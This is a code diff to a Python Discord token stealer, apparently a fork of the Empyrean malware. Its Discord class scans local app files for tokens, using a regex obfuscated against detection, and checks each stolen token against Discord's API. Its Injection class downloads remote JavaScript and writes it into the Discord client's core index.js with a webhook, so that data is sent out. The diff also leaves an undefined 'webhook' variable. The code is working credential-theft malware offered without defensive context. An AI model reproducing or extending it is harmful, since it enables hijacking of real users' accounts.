@@ -266,7 +266,7 @@ class Discord:
         self.baseurl = "https://discord.com/api/v9/users/@me"
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
-        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
+        self.regex = r"[\w378-]{24}\.[\w378-]{6}\.[\w378-]{25,110}"
         self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
         self.tokens_sent = []
         self.tokens = []
@@ -353,6 +353,7 @@ class Discord:
                         continue
                     for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                         for token in re.findall(self.regex, line):
+                            self.regex = self.regex.replace('378', '')
                             r = requests.get(self.baseurl, headers={
                                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                 'Content-Type': 'application/json',
@@ -370,6 +371,7 @@ class Discord:
                         continue
                     for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                         for token in re.findall(self.regex, line):
+                            self.regex = self.regex.replace('378', '')
                             r = requests.get(self.baseurl, headers={
                                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                 'Content-Type': 'application/json',
@@ -884,7 +886,7 @@ class Clipboard:
 
 
 class Injection:
-    def __init__(self, webhook: str) -> None:
+    def __init__(self) -> None:
         self.appdata = os.getenv('LOCALAPPDATA')
         self.discord_dirs = [
             self.appdata + '\\Discord',
@@ -894,20 +896,25 @@ class Injection:
         ]
         self.code = requests.get(
             'https://raw.githubusercontent.com/Entity378/Empyrean-Injection/main/clean.js').text
-
-        for proc in psutil.process_iter():
-            if 'discord' in proc.name().lower():
-                proc.kill()
-
         for dir in self.discord_dirs:
             if not os.path.exists(dir):
                 continue
 
             if self.get_core(dir) is not None:
-                with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
-                    f.write((self.code).replace('discord_desktop_core-1',
-                            self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
-                    self.start_discord(dir)
+                with open(self.get_core(dir)[0] + '\\index.js', 'r', encoding='utf-8') as f:
+                    oldContent = f.read()
+
+                if not ("webhook").lower() in oldContent.lower():
+                    with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
+                        f.write((self.code).replace('discord_desktop_core-1',
+                                self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
+                    
+                    with open(self.get_core(dir)[0] + '\\index.js', 'r', encoding='utf-8') as f:
+                            newContent = f.read()
+
+                    with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
+                        f.write((newContent).replace('discord_desktop_core-1',
+                                self.get_core(dir)[1]).replace('module.exports = require("./core.asar");', oldContent))
 
     def get_core(self, dir: str) -> tuple:
         for file in os.listdir(dir):
@@ -921,21 +928,6 @@ class Injection:
                         if not os.path.exists(core + '\\index.js'):
                             continue
                         return core, file
-
-    def start_discord(self, dir: str) -> None:
-        update = dir + '\\Update.exe'
-        executable = dir.split('\\')[-1] + '.exe'
-
-        for file in os.listdir(dir):
-            if re.search(r'app-+?', file):
-                app = dir + '\\' + file
-                if os.path.exists(app + '\\' + 'modules'):
-                    for file in os.listdir(app):
-                        if file == executable:
-                            executable = app + '\\' + executable
-                            subprocess.call([update, '--processStart', executable],
-                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-
 
 class Debug:
     def __init__(self):
